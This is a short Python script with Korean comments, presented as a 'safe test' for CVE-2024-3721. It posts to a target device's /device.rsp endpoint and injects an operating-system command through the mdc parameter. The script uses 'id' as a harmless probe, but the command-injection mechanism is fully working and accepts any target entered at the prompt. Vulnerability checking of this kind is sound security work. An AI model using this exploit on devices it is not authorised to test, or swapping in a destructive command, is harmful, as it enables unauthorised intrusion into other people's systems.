# SPDX-FileCopyrightText: © 2025 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests

def safe_test_cve_2024_3721(target_ip):
    """
    CVE-2024-3721 취약점 안전 테스트용 스크립트
    :param target_ip: 테스트 대상 IP 또는 도메인
    """
    url = f"http://{target_ip}/device.rsp"
    params = {
        "opt": "sys",
        "cmd": "___S_O_S_T_R_E_A_MAX___",
        "mdb": "sos",
        "mdc": "id"  # 위험한 명령어 대신 단순 시스템 정보 조회 명령어
    }

    try:
        print(f"[+] {url} 에 안전한 테스트 페이로드 전송 중...")
        response = requests.post(url, params=params, timeout=10)
        print("[+] 응답 코드:", response.status_code)
        print("[+] 응답 내용 일부:")
        print(response.text[:500])
    except Exception as e:
        print("[!] 요청 중 오류 발생:", e)

if __name__ == "__main__":
    target = input("테스트할 대상 IP 또는 도메인 입력 >> ").strip()
    safe_test_cve_2024_3721(target)
